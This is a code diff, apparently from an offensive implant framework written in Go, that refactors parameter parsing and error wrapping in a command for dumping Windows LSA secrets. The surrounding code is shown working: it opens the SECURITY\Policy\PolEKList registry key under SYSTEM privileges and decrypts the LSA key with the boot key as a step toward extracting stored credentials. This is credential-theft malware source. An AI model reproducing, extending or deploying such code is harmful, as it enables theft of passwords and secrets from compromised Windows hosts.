@@ -5,7 +5,6 @@ package commands
 
 import (
 	"encoding/binary"
-	"encoding/json"
 	"fmt"
 	"strings"
 
@@ -30,11 +29,9 @@ type lsaSecretsArgs struct {
 func (c *LsaSecretsCommand) Execute(task structs.Task) structs.CommandResult {
 	// Note: no LockOSThread needed — SYSTEM process token grants access
 
-	var args lsaSecretsArgs
-	if task.Params != "" {
-		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return errorf("Failed to parse parameters: %v", err)
-		}
+	args, parseErr := unmarshalParams[lsaSecretsArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	if args.Action == "" {
@@ -73,13 +70,13 @@ func (c *LsaSecretsCommand) Execute(task structs.Task) structs.CommandResult {
 func lsaDecryptKey(bootKey []byte) ([]byte, error) {
 	hKey, err := regOpenKey(hkeyLocalMachine, `SECURITY\Policy\PolEKList`)
 	if err != nil {
-		return nil, fmt.Errorf("open PolEKList: %v (pre-Vista not supported)", err)
+		return nil, fmt.Errorf("open PolEKList: %w (pre-Vista not supported)", err)
 	}
 	defer regCloseKey(hKey)
 
 	data, err := regQueryValue(hKey, "")
 	if err != nil {
-		return nil, fmt.Errorf("read PolEKList: %v", err)
+		return nil, fmt.Errorf("read PolEKList: %w", err)
 	}
 
 	// LSA_SECRET: version(4) + keyID(16) + algo(4) + flags(4) + encData(rest)
@@ -96,7 +93,7 @@ func lsaDecryptKey(bootKey []byte) ([]byte, error) {
 	// AES-256-ECB decrypt the remaining data
 	plaintext, err := lsaAESDecryptECB(tmpKey, encData[32:])
 	if err != nil {
-		return nil, fmt.Errorf("AES decrypt PolEKList: %v", err)
+		return nil, fmt.Errorf("AES decrypt PolEKList: %w", err)
 	}
 	defer structs.ZeroBytes(plaintext)
 
